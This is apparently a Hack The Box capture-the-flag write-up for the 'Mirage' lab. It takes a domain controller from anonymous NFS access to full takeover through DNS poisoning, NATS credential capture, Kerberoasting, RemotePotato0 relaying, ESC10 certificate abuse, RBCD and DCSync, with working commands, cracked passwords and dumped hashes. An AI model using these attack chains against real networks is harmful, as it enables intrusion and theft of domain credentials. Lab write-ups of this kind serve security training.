---
icon: mountain
---

# HTB-MIRAGE

<figure><img src="../../../../.gitbook/assets/image (529).png" alt=""><figcaption></figcaption></figure>

## Attack Flow

<figure><img src="../../../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

## Reconnaissance

#### Port Scanning with Nmap

First, I performed a comprehensive port scan to identify all open services:

```bash
nmap -sC -sV -p- 10.129.232.163
```

**What we found:**

* **Port 53 (DNS)**: Simple DNS Plus
* **Port 88 (Kerberos)**: Windows Active Directory authentication
* **Port 389/636 (LDAP/LDAPS)**: Directory services
* **Port 445 (SMB)**: File sharing
* **Port 2049 (NFS)**: Network File System (unusual on Windows!)
* **Port 4222**: NATS messaging system (interesting!)
* **Port 5985 (WinRM)**: Remote management
* **Multiple RPC ports**: Standard Windows services

#### Adding Hosts to /etc/hosts

```bash
echo "10.129.232.163 dc01.mirage.htb mirage.htb" | sudo tee -a /etc/hosts
```

This allows us to resolve the domain names locally.

***

## Initial Access

#### Phase 1: NFS Enumeration

**What we're doing**: Checking for exposed NFS shares (a misconfiguration on Windows systems).

```bash
showmount --all dc01.mirage.htb
```

**Output:**

```
All mount points on dc01.mirage.htb:
10.10.10.40:/MirageReports
10.10.10.40:/nfs_share
```

**Why this works**: NFS was misconfigured to allow anonymous access to shares.

#### Mounting the NFS Share

```bash
mkdir mnt
sudo mount -t nfs dc01.mirage.htb:/MirageReports ./mnt
find mnt
```

**What we found:**

* `Incident_Report_Missing_DNS_Record_nats-svc.pdf`
* `Mirage_Authentication_Hardening_Report.pdf`

**Critical Information from PDFs:**

1. **Username discovered**: `dev_account_a` - mentioned as a testing account
2. **NATS service** is in active use
3. **Missing DNS record**: `nats-svc.mirage.htb` doesn't exist
4. **DNS scavenging enabled**: Allows dynamic DNS updates
5. **NTLM being phased out**: Legacy systems still need it
6. **Authentication required**: NATS requires credentials

**Attack Strategy Forming**: If DNS allows dynamic updates and NATS is configured to connect to `nats-svc.mirage.htb`, we can:

1. Create the DNS record pointing to our IP
2. Capture NATS authentication attempts
3. Extract credentials

#### Phase 2: DNS Poisoning Attack (Dynamic DNS Update)

**What we're doing**: Creating a malicious DNS record to redirect traffic to our attacking machine.

```bash
nsupdate << EOF
server 10.129.232.163
update add nats-svc.mirage.htb 100 A 10.10.10.10
send
EOF
```

**Why this works**: Simple DNS Plus allows DNS updates from the private network without authentication by default (misconfiguration).

**Verification:**

```bash
nslookup nats-svc.mirage.htb 10.129.232.163
```

Now `nats-svc.mirage.htb` resolves to our attacking machine!

#### Phase 3: NATS Credential Capture

**What we're doing**: Setting up a fake NATS server to capture authentication attempts.

**Step 1 - Quick Test:**

```bash
nc -lvnp 4222
```

We immediately get a connection! Something is automatically trying to connect to `nats-svc.mirage.htb:4222`.

**Step 2 - Setting up proper NATS server:**

```bash
docker run -d --name nats-main -p 4222:4222 -p 6222:6222 -p 8222:8222 nats
```

**Step 3 - Capturing traffic with tcpdump:**

```bash
sudo tcpdump -s0 -A -i tun0 port 4222
```

**What we captured:**

From Server (our fake NATS):

```json
{
  "server_id":"NDMBQV6U2YDWGF6XJ6E2ETEEULZNH6YBNBUYKSGIDQYTCDSZT7FZLRN2",
  "version":"2.12.1",
  "host":"0.0.0.0",
  "port":4222,
  "auth_required":true
}
```

From Client (DC01):

```json
{
  "user":"Dev_Account_A",
  "pass":"hx5h7F5554fP@1337!",
  "tls_required":false
}
```

**Credentials obtained**: `Dev_Account_A:hx5h7F5554fP@1337!`

**Why this attack worked**:

1. DNS was misconfigured to allow updates
2. A service on DC01 was configured to auto-connect to `nats-svc.mirage.htb`
3. The service stored credentials in plaintext
4. No certificate pinning or validation was in place

#### Phase 4: NATS Enumeration with Valid Credentials

**Installing NATS CLI:**

```bash
# Installation varies by OS
go install github.com/nats-io/natscli/nats@latest
```

**Listing available streams:**

```bash
nats --server nats://dc01.mirage.htb:4222 \
     --user 'Dev_Account_A' \
     --password 'hx5h7F5554fP@1337!' \
     stream ls
```

**Output:**

```
┌──────────────────────────────────────────────┐
│                   Streams                     │
├───────────┬─────────────┬──────────┬──────┤
│ Name      │ Created     │ Messages │ Size │
├───────────┼─────────────┼──────────┼──────┤
│ auth_logs │ 2025-05-05  │ 5        │ 570B │
└───────────┴─────────────┴──────────┴──────┘
```

**Reading messages from auth\_logs stream:**

```bash
nats --server nats://dc01.mirage.htb:4222 \
     --user 'Dev_Account_A' \
     --password 'hx5h7F5554fP@1337!' \
     stream view auth_logs
```

**What we found (repeated 5 times):**

```json
{
  "user":"david.jjackson",
  "password":"pN8kQmn6b86!1234@",
  "ip":"10.10.10.20"
}
```

**New credentials**: `david.jjackson:pN8kQmn6b86!1234@`

**Why this matters**: These logs contain authentication attempts, likely from a monitoring or logging system that captured user credentials in plaintext (major security vulnerability).

<figure><img src="../../../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>

#### Phase 5: Domain Authentication with Kerberos

**Important Note**: NTLM is disabled, so we must use Kerberos authentication.

**Clock Skew Issue**: Kerberos requires time synchronization within 5 minutes. The machine has a 7-hour time difference, so we use `faketime` to adjust.

**Testing authentication:**

```bash
faketime -f +7h nxc smb dc01.mirage.htb \
                     -u 'david.jjackson' \
                     -p 'pN8kQmn6b86!1234@' \
                     -k
```

**Output:**

```
SMB    dc01.mirage.htb  445    dc01    [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

**Success!** We now have valid domain credentials.

**Generating Kerberos configuration:**

```bash
faketime -f +7h nxc smb dc01.mirage.htb \
                     -u 'david.jjackson' \
                     -p 'pN8kQmn6b86!1234@' \
                     -k \
                     --generate-krb5-file krb5.conf

sudo cp krb5.conf /etc/krb5.conf
```

**What this does**: Creates a proper Kerberos configuration file for the domain, allowing seamless authentication.

***

## Privilege Escalation

#### Phase 1: Enumerating Active Directory with BloodHound

**What we're doing**: Collecting comprehensive AD data to identify privilege escalation paths.

```bash
faketime -f +7h bloodhound-ce-python \
    --domain mirage.htb \
    --username 'david.jjackson' \
    --password 'pN8kQmn6b86!1234@' \
    --kerberos \
    --nameserver 10.129.232.163 \
    --dns-tcp \
    --collection ALL \
    --zip
```

**What BloodHound collects:**

* All users and their properties
* Group memberships
* ACLs (Access Control Lists)
* Kerberoastable accounts
* Paths to Domain Admin
* Trust relationships

**Upload the ZIP to BloodHound GUI for analysis.**

### Kerberoasting Attack on nathan.aadam

**What BloodHound revealed**: Using the "List all Kerberoastable Accounts" query, we found:

<figure><img src="../../../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>

* **nathan.aadam** has a Service Principal Name (SPN): `HTTP/exchange.mirage.htb`
* Member of **IT\_Admins** group
* Member of **Remote Management Users** group (can use WinRM)

**What is Kerberoasting?**

* When a user has an SPN, anyone can request a service ticket
* The ticket is encrypted with the user's password hash
* We can crack this offline to get the plaintext password
* This is a **T1558.003 - Kerberoasting** attack

**Requesting the service ticket:**

```bash
faketime -f +7h impacket-GetUserSPNs \
    -dc-host dc01.mirage.htb \
    -k \
    -request-user nathan.aadam \
    MIRAGE.HTB/david.jjackson@dc01.mirage.htb
```

**Output (TGS-REP hash):**

```
$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$MIRAGE.HTB/nathan.aadam*$86f5a...
```

**Cracking with Hashcat:**

```bash
hashcat -m 13100 nathan.hash /usr/share/wordlists/rockyou.txt
```

**Mode 13100**: Kerberos 5, etype 23, TGS-REP

**Cracked password**: `3edc#EDC3`

**Why this worked**: The user had a weak password that existed in a wordlist.

#### WinRM Access as nathan.aadam

```bash
faketime -f +7h evil-winrm -i dc01.mirage.htb \
                           -u 'nathan.aadam' \
                           -p '3edc#EDC3'
```

**Success!** We now have shell access to the Domain Controller.

**Getting the user flag:**

```powershell
type C:\Users\nathan.aadam\Desktop\user.txt
```

### Finding mark.bbond via Active Sessions

**Updating BloodHound data from inside:**

```powershell
.\SharpHound.exe -c All
```

<figure><img src="../../../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>

**What we found**: BloodHound shows **mark.bbond** has an active session on DC01.

<figure><img src="../../../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>

**Attack Strategy**: Capture mark.bbond's authentication using RemotePotato0.

RemotePotato0 - NTLM Relay Attack

**What is RemotePotato0?**

* Exploits DCOM activation to force authentication
* Works by:
  1. Triggering a COM object creation in another user's session
  2. The COM server tries to authenticate back
  3. We relay this authentication to capture the hash

**This is T1557 - Adversary-in-the-Middle attack**

**Step 1 - Setting up relay on Kali:**

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:dc01.mirage.htb:9999
```

This forwards port 135 (DCOM) to port 9999 on the victim.

**Step 2 - Running RemotePotato0 on DC01:**

```powershell
.\RemotePotato0.exe -m 2 -s 1 -x 10.10.10.10
```

**Parameters explained:**

* `-m 2`: Mode 2 (capture hash)
* `-s 1`: Session ID 1 (mark.bbond's session)
* `-x 10.10.10.10`: Our attacker IP

**Output:**

```
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : MIRAGE\mark.bbond
NTLMv2 Hash     : mark.bbond::MIRAGE:cf848b1f45357402:ac126b...
```

**Cracking with Hashcat:**

```bash
hashcat -m 5600 mark.hash /usr/share/wordlists/rockyou.txt
```

**Mode 5600**: NTLMv2

**Cracked password**: `1day@atime`

**Why this attack worked**:

1. mark.bbond had an active session on the DC
2. We had local access to trigger COM objects
3. No network segmentation prevented the relay

#### Privilege Path via BloodHound

**Analyzing mark.bbond's privileges in BloodHound:**

<figure><img src="../../../../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>

Path discovered:

1. **mark.bbond** → member of **IT\_Support** group
2. **IT\_Support** → has **ForceChangePassword** on **javier.mmarshall**
3. **javier.mmarshall** → can **ReadGMSAPassword** on **mirage-service$**

**This is our escalation path!**

### Resetting javier.mmarshall's Password

**Using powerview.py for Active Directory manipulation:**

```bash
faketime -f +7h powerview -k MIRAGE.HTB/mark.bbond@dc01.mirage.htb
```

**Setting new password:**

```
PV ❯ Set-DomainUserPassword -Identity javier.mmarshall -AccountPassword 'Helloworld123!'
```

**Testing the credentials - FAILS!**

**Investigating the user account:**

```
PV ❯ Get-ADObject -Identity javier.mmarshall
```

**Problems found:**

1. `userAccountControl: ACCOUNTDISABLE` - Account is disabled
2. `logonHours: AAAAAAAAAAAAAAAAAAAAAAAAAAAA` - Restricted logon hours

**Fixing the account:**

```
PV ❯ Enable-ADAccount -Identity javier.mmarshall
PV ❯ Set-ADObject -Identity javier.mmarshall -Clear logonHours
```

**Now the credentials work!**

#### Reading GMSA Password

**What is GMSA (Group Managed Service Account)?**

* Automatic password management by AD
* 240-character random passwords
* Changed automatically every 30 days
* Authorized users can read the password

**Reading mirage-service$ password:**

```bash
faketime -f +7h powerview -k MIRAGE.HTB/javier.mmarshall@dc01.mirage.htb
```

```
PV ❯ Get-GMSA
```

**Output:**

```
sAMAccountName              : Mirage-Service$
msDS-ManagedPassword        : 738eeff47da231dec805583638b8a91f
```

**This is the NTLM hash for mirage-service$!**

***

### Root Access

#### Phase 1: Analyzing mirage-service$ Privileges

**Getting a Kerberos ticket:**

```bash
faketime -f +7h impacket-getTGT -k \
    -no-pass \
    -hashes :738eeff47da231dec805583638b8a91f \
    'MIRAGE.HTB/mirage-service$'@dc01.mirage.htb

export KRB5CCNAME=mirage-service\$@dc01.mirage.htb.ccache
```

**Checking writable attributes:**

```bash
faketime -f +7h bloodyAD --host dc01.mirage.htb \
    --domain mirage.htb \
    --username 'mirage-service$' \
    -k get writable --detail
```

**Key findings on mark.bbond:**

* `msDS-AllowedToDelegateTo: WRITE`
* `servicePrincipalName: WRITE`
* `userPrincipalName: WRITE` ← **This is critical!**

#### Phase 2: ESC10 - ADCS Certificate Attack

**What is ESC10?**

* Active Directory Certificate Services vulnerability
* Exploits weak certificate mapping
* When `CertificateMappingMethods` registry key = 4, certificates map to UPN
* We can request a cert as one user, then change the UPN

**This is T1098.007 - Additional Cloud Credentials attack**

**Checking if vulnerable:**

```powershell
(Get-ItemProperty -Path "HKLM:SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" -Name CertificateMappingMethods).CertificateMappingMethods
```

**Output:** `4` ← Vulnerable!

#### Phase 3: Executing ESC10 Attack

**Step 1 - Change mark.bbond's UPN to DC01$:**

```bash
faketime -f +7h certipy-ad account \
    -u 'mirage-service$@mirage.htb' \
    -hashes :738eeff47da231dec805583638b8a91f \
    -dc-host dc01.mirage.htb \
    -k \
    -user mark.bbond \
    -upn 'dc01$@mirage.htb' \
    update
```

**Why this works**: We're changing mark.bbond's UPN to impersonate the Domain Controller computer account.

**Step 2 - Get Kerberos ticket for mark.bbond:**

```bash
faketime -f +7h impacket-getTGT -k MIRAGE.HTB/mark.bbond@dc01.mirage.htb

export KRB5CCNAME=mark.bbond@dc01.mirage.htb.ccache
```

**Step 3 - Request certificate with fake UPN:**

```bash
faketime -f +7h certipy-ad req \
    -dc-host dc01.mirage.htb \
    -k \
    -ca mirage-DC01-CA \
    -template 'User'
```

**Output:**

```
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-...-1109' (mark.bbond's SID)
[*] Saving certificate and private key to 'dc01.pfx'
```

**Step 4 - Restore original UPN:**

```bash
faketime -f +7h certipy-ad account \
    -u 'mirage-service$@mirage.htb' \
    -hashes :738eeff47da231dec805583638b8a91f \
    -dc-host dc01.mirage.htb \
    -k \
    -user mark.bbond \
    -upn 'mark.bbond@mirage.htb' \
    update
```

**Why reset UPN?**: To avoid detection and maintain stealth.

#### Phase 4: Authenticating with Certificate

```bash
certipy-ad auth -pfx dc01.pfx \
    -dc-ip 10.129.232.163 \
    -ldap-shell
```

**Output:**

```
[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*] Authenticated to '10.129.232.163' as: 'u:MIRAGE\DC01$'
```

**We're now authenticated as the Domain Controller computer account!**

#### Phase 5: Resource-Based Constrained Delegation (RBCD)

**What is RBCD?**

* Allows a service to impersonate users to another service
* Controlled by `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
* We can set this because we control DC01$

**Setting up RBCD in LDAP shell:**

```
# whoami
u:MIRAGE\DC01$

# set_rbcd dc01$ mirage-service$
```

**What this does**: Allows mirage-service$ to impersonate ANY user (including admins) to DC01$.

**This is T1550.003 - Pass the Ticket attack**

#### Phase 6: S4U2Proxy - Impersonating Domain Controller

**Getting service ticket as DC01$:**

```bash
faketime -f +7h impacket-getST \
    -spn 'cifs/dc01.mirage.htb' \
    -impersonate 'DC01$' \
    -hashes :738eeff47da231dec805583638b8a91f \
    'MIRAGE.HTB/mirage-service$'@dc01.mirage.htb
```

**What this does**:

* Uses S4U2Self to get a ticket for DC01$ (impersonation)
* Uses S4U2Proxy to get a CIFS service ticket
* CIFS = file sharing access

**Output:**

```
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
```

**Setting the ticket:**

```bash
export KRB5CCNAME=DC01\$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
```

#### Phase 7: DCSync Attack - Dumping All Domain Hashes

**What is DCSync?**

* Pretends to be a Domain Controller
* Requests password data from another DC
* Extracts all domain credentials
* This is **T1003.006 - DCSync** attack

```bash
faketime -f +7h impacket-secretsdump -k -no-pass dc01.mirage.htb
```

**Output (all domain hashes):**

```
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
```

**We now have the Administrator hash!**

#### Phase 8: Pass-the-Hash to Administrator Shell

```bash
faketime -f +7h evil-winrm -i dc01.mirage.htb \
    -u Administrator \
    -H 7be6d4f3c2b9c0e3560f5a29eeb1afb3
```

**Getting root flag:**

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>
